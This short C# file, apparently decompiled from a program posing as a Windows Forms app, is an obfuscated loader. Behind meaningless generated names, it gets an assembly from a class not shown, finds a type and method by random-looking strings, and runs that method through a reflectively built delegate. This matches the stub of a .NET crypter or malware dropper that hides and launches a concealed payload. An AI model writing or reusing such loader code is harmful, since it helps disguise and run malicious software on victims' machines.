using System;
using System.Reflection;

namespace WindowsFormsApp23;

internal class PagePublisherResolver
{
	private static PagePublisherResolver SortMapping;

	private static void Main()
	{
		new RecordPublisherResolver();
		CallExporter()();
	}

	private static Action CallExporter()
	{
		return (Action)Delegate.CreateDelegate(typeof(Action), RemoveExporter() as MethodInfo);
	}

	private static object RemoveExporter()
	{
		return CustomizeMapping(new RecordPublisherResolver().InitExporter(), "Ycenwxmiajgsehh.Akqjaoendqytj").GetMethod("Ahifsbiwctphizzgwwqrbbpq");
	}

	internal static bool PrintMapping()
	{
		return SortMapping == null;
	}

	internal static PagePublisherResolver PublishMapping()
	{
		return SortMapping;
	}

	internal static Type CustomizeMapping(object object_0, object object_1)
	{
		return ((Assembly)object_0).GetType((string)object_1);
	}
}
